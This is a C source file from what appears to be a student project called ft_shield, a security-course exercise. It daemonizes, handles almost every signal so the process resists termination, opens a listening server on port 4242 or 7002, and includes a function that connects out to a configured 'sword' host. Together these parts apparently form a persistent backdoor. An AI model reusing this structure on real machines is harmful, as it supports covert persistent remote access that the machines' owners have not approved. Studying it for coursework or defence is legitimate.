/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   ctx.c                                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/11/21 13:27:44 by mbatty            #+#    #+#             */
/*   Updated: 2025/12/04 14:42:49 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ctx.h"

#if DO_DAEMON
	static void	write_pid_to_lock(int lock_fd)
	{
		char	buf[4096];

		sprintf(buf, "%d", getpid());
		write(lock_fd, buf, strlen(buf));
	}

	static int	daemonize(t_ctx *ctx)
	{
		(void)ctx;
		pid_t	pid;

		pid = fork();
		if (pid != 0)
			return (0);

		setsid();

		pid = fork();
		if (pid != 0)
			return (0);

		if (chdir("/") == -1)
			return (0);

		write_pid_to_lock(ctx->lock_fd);
		return (1);
	}
#endif

static int	lock_file(t_ctx *ctx)
{
	ctx->lock_fd = open(LOCK_FILE, O_RDWR | O_CREAT, 0640);
	if (ctx->lock_fd < 0)
	{
		logger_log(LOG_ERROR, "Failed to lock " LOCK_FILE);
		return (0);
	}
	if (flock(ctx->lock_fd, LOCK_EX | LOCK_NB) < 0)
	{
		logger_log(LOG_ERROR, "Failed to lock " LOCK_FILE);
		return (0);
	}
	logger_log(LOG_INFO, "Locked " LOCK_FILE);
	return (1);
}

static int	unlock_file(t_ctx *ctx)
{
	flock(ctx->lock_fd, LOCK_UN);
	close(ctx->lock_fd);
	remove(LOCK_FILE);
	return (1);
}

int	get_sword_fd()
{
	struct sockaddr_in	server_addr;
	int					socket_fd;

	memset(&server_addr, 0, sizeof(server_addr));
	socket_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (socket_fd == -1)
		return (-1);

	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(SWORD_PORT);
	inet_pton(AF_INET, SWORD_IP, &server_addr.sin_addr);

	if (connect(socket_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1)
	{
		close(socket_fd);
		return (-1);
	}
	return (socket_fd);
}

static void	send_host_to_sword(int server_port)
{
	char host_buffer[256];
	char *ip_buffer;
	struct hostent *host_entry;
	int hostname;

	hostname = gethostname(host_buffer, sizeof(host_buffer));
	if (hostname == -1)
		return ;

	host_entry = gethostbyname(host_buffer);
	if (!host_entry)
		return ;

	ip_buffer = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));
	if (!ip_buffer)
		return ;

	logger_log(LOG_INFO, "Running ft_shield on %s (%s) %d", ip_buffer, host_buffer, server_port);
}

static int	setup_signals()
{
	signal(SIGINT, handle_sig);
	signal(SIGTERM, handle_sig);
	signal(SIGHUP, handle_sig);
	signal(SIGINT, handle_sig);
	signal(SIGQUIT, handle_sig);
	signal(SIGILL, handle_sig);
	signal(SIGTRAP, handle_sig);
	signal(SIGABRT, handle_sig);
	signal(SIGIOT, handle_sig);
	signal(SIGBUS, handle_sig);
	signal(SIGFPE, handle_sig);
	signal(SIGUSR1, handle_sig);
	signal(SIGSEGV, handle_sig);
	signal(SIGUSR2, handle_sig);
	signal(SIGPIPE, handle_sig);
	signal(SIGALRM, handle_sig);
	signal(SIGTERM, handle_sig);
	signal(SIGSTKFLT, handle_sig);
	signal(SIGCONT, handle_sig);
	signal(SIGTSTP, handle_sig);
	signal(SIGTTIN, handle_sig);
	signal(SIGTTOU, handle_sig);
	signal(SIGURG, handle_sig);
	signal(SIGXCPU, handle_sig);
	signal(SIGXFSZ, handle_sig);
	signal(SIGVTALRM, handle_sig);
	signal(SIGPROF, handle_sig);
	signal(SIGWINCH, handle_sig);
	signal(SIGPOLL, handle_sig);
	signal(SIGIO, handle_sig);
	signal(SIGPWR, handle_sig);
	signal(SIGSYS, handle_sig);
	return (1);
}

static int	ctx_open_server(t_ctx *ctx)
{
	int	server_port;
	if (ctx->is_root)
		server_port = 4242;
	else
		server_port = 7002;

	logger_log(LOG_INFO, "Opening server");
	if (!server_open(&ctx->server, server_port))
	{
		logger_log(LOG_ERROR, "Failed to open server");
		close(ctx->lock_fd);
		return (0);
	}
	server_set_message_hook(&ctx->server, message_hook, ctx);
	server_set_connect_hook(&ctx->server, connect_hook, ctx);
	server_set_disconnect_hook(&ctx->server, disconnect_hook, ctx);
	logger_log(LOG_INFO, "Server opened");
	send_host_to_sword(server_port);
	return (1);
}

int	ctx_init(t_ctx *ctx)
{
	ctx->running = true;
	setup_signals();
	logger_log(LOG_INFO, "Starting ft_shield");
	if (!lock_file(ctx))
		return (0);

	#if DO_DAEMON
		if (!daemonize(ctx))
		{
			close(ctx->lock_fd);
			return (0);
		}
	#endif
	ctx_open_server(ctx);
	return (1);
}

int	ctx_delete(t_ctx *ctx, bool log)
{
	if (log)
	{
		logger_log(LOG_INFO, "Closing server");
		server_send_to_all(&ctx->server, "Closing server.\n");
	}
	server_close(&ctx->server);
	if (log)
		logger_log(LOG_INFO, "Closing ft_shield");
	unlock_file(ctx);
	if (log)
		logger_log(LOG_INFO, "Unlocked " LOCK_FILE);
	return (0);
}
